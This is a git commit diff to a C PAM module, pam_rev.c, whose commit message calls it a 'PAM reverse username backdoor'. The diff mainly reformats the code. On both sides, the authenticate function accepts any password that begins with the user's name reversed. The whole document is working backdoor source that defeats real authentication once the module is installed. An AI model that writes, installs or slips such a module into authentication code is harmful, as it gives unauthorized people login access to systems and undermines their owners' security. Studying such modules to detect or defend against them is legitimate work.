ad4ca74c039406a55e03e0f573a64627e97edd27
Rasmus Moorats <me@neonsea.uk>
2019-01-07 12:06:25 +0000

    PAM reverse username backdoor

--- pam_rev.c
+++ pam_rev.c
@@ -19,12 +19,12 @@
 #include <security/pam_ext.h>
 #include <security/pam_modules.h>
 
-char *strrev(char *str)
-{
+char *strrev(char *str) {
       char *p1, *p2;
 
       if (! str || ! *str)
             return str;
+
       for (p1 = str, p2 = str + strlen(str) - 1; p2 > p1; ++p1, --p2)
       {
             *p1 ^= *p2;
@@ -47,18 +47,17 @@ PAM_EXTERN int pam_sm_acct_mgmt
 PAM_EXTERN int pam_sm_authenticate
 (pam_handle_t *pamh, int flags, int argc, const char **argv) {
     int retval = PAM_ABORT;
-    char *password;
+    const char *password;
     const char *user;
 
-    pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&password, NULL);
+    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
     pam_get_user(pamh, &user, NULL);
 
     char *rev = strdup(user);
     strrev(rev);
 
-    if (!strncmp(password, rev, strlen(rev))) {
+    if (!strncmp(password, rev, strlen(rev)))
         retval = PAM_SUCCESS;
-    }
 
     free(rev);
     return retval;
